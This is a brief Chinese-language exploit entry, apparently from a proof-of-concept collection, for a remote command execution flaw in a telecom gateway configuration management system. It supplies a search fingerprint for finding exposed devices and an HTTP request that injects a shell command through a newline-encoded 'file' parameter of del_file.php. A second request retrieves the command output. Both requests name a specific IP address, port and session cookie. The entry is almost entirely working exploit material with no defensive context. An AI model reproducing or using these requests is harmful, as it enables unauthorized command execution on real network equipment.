# 电信网关配置管理系统某接口存在RCE漏洞

- **系统**：电信网关配置管理系统某接口　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="img/login_bg3.png"`
- **请求**：`GET /manager/newtpl/del_file.php?file=1.txt%0Awhoami+%3E+whoami.txt HTTP/1.1`
- **关键头**：`Host: 219.140.127.49:8888`　`Content-Length: 0`

**请求体 / payload**
```
GET /manager/newtpl/whoami.txt HTTP/1.1
Host: 219.140.127.49:8888
Cookie: PHPSESSID=u9vrdct7fhic6d4mq4v1uesui3
```